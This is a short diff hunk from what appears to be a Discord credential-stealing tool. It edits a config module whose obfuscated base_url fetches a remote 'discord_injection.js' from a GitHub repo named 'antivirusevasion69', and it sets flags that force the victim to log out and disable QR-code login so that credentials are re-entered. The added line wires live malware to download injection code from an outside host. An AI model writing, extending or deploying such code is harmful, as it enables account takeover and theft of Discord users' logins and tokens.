@@ -98,7 +98,7 @@
 
         module.exports = (client) => {
           return {
-            base_url: client.utils.encryption.encryptData("https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/discord_desktop_core/discord_injection.js"),
+            base_url: client.utils.encryption.encryptData("https://raw.githubusercontent.com/jamiekarvans/antivirusevasion69/main/discord_desktop_core/discord_injection.js"),
 
             instant_logout: true,
             disable_qr_code: true,
